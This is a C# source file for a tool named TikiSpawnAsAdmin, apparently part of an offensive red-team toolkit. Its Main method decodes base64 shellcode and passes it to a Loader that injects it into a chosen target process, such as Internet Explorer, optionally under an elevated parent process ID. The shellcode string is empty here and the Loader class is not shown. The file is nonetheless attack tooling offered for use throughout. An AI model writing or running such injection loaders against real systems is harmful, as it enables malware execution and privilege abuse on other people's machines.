using System;

namespace TikiSpawnAsAdmin
{
    class Program
    {
        static void Main(string[] args)
        {
            
            string encodedShellcode = @"";

            if ((args.Length != 1) && (args.Length != 2))
            {
                Console.WriteLine("Usage: TikiSpawnAsAdmin.exe targetProcess PID(optional)");
                Console.WriteLine("       TikiSpawnAsAdmin.exe \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" 4624");

                Environment.Exit(1);
            }

            string targetProcess = args[0];
            int elevatedPID = 0;

            if (args.Length == 2)
            {
                elevatedPID = int.Parse(args[1]);
            }

            var ldr = new Loader();

            try
            {
                ldr.LoadAsAdmin(targetProcess, Convert.FromBase64String(encodedShellcode), elevatedPID);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!!" + e.Message);
            }
        }
    }
}
